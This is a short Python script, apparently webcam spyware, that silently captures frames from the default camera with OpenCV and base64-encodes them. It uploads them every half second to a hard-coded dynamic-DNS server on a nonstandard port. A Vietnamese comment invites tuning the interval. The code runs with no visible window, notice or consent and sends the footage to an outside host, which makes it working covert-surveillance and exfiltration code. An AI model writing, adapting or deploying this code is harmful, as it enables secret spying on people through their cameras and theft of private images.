import cv2
import requests
import base64
import time

url = "http://3r0th3rcc.ddns.net:1412/upload"

cap = cv2.VideoCapture(0)

if not cap.isOpened():
    exit()

try:
    while True:
        ret, frame = cap.read()
        if not ret:
        
            break

        _, buffer = cv2.imencode('.jpg', frame)
        img_b64 = base64.b64encode(buffer).decode()

        res = requests.post(url, data={'image': img_b64})

        time.sleep(0.5)  # gửi mỗi 1 giây, bạn chỉnh sửa theo ý muốn

except KeyboardInterrupt:
    pass

finally:
    cap.release()
